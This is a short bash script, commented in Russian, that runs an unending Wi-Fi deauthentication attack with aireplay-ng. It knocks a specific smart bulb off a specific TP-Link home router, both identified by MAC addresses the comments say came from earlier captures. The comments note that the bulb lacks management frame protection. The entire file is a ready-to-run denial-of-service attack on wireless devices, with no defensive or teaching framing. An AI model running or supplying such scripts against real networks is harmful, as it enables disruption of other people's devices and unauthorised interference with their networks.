#!/bin/bash
# отправляет deauth фреймы лампочке
# лампочка не поддерживает MFP поэтому принимает их без проверки

# цели из наших дампов
AP="D8:0D:17:7F:5E:56"       # домашний роутер TP-Link_5E56
BULB="FE:3C:D7:A3:D0:5F"     # MAC лампочки (клиентский режим)
IFACE="wlan1mon"

# читаем канал если был сохранён сканером
if [ -f logs/home_channel.txt ]; then
    CHANNEL=$(cat logs/home_channel.txt)
else
    CHANNEL=10
fi

echo "[log] переключаемся на канал $CHANNEL"
iwconfig $IFACE channel $CHANNEL

echo "[log] запускаем deauth: $BULB отключается от $AP"
echo "[log] ctrl+c чтобы остановить"

# -0 0 = бесконечно, -a = точка доступа, -c = клиент
aireplay-ng -0 0 -a $AP -c $BULB $IFACE
